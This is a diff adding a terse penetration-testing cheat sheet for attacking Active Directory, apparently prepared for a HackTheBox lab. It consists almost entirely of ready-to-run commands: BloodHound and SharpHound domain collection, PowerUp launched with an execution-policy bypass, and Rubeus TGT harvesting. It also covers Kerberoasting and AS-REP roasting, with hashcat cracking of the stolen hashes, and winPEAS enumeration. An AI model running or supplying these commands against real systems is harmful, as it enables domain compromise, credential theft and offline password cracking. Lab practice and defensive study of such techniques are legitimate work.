@@ -1,0 +1,33 @@
+         ---ACTIVE DIRECTORY AT LOCAL---
+  
+             --BLOODHOUND
+  1-)neo4j console (starting neo4j at local)
+  2-)bloodhound (start bloodhound.exe at local and go to link = bolt://localhost:7687)
+  3-)sharphound.exe (upload this file from place\BloodHound\Ingestors and start sharphound.exe at target system)
+  4-)download .csv files from target machine
+  5-)open .csv files on blood hound
+  
+             --PowerUp.Ps1--
+  powershell.exe -nop -exec bypass
+  Import-Module PowerUp.ps1
+  Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
+  
+             --Rubeus.exe--
+  rubeus.exe harvest /interval:30 (get TGT per 30 secs)
+  
+  2-)Kerberoasting:
+  rubeus.exe kerberoast
+  [copy the hash to your attack box into a file — we’ll call it hash.txt]
+  hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+  
+  2-)AS-REP Roasting:
+  rubeus.exe asreproast /format:hashcat /outfile:<filename of choice>
+  [save hash to file on attack box — we’ll call it hash.txt]
+  hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
+  
+             --WinPEAS.exe
+  download that binary file from attacker machine or original link than
+  .\winPEAS.exe (start enumerating)
+  
+             --Sharphound.exe
+  .\SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100
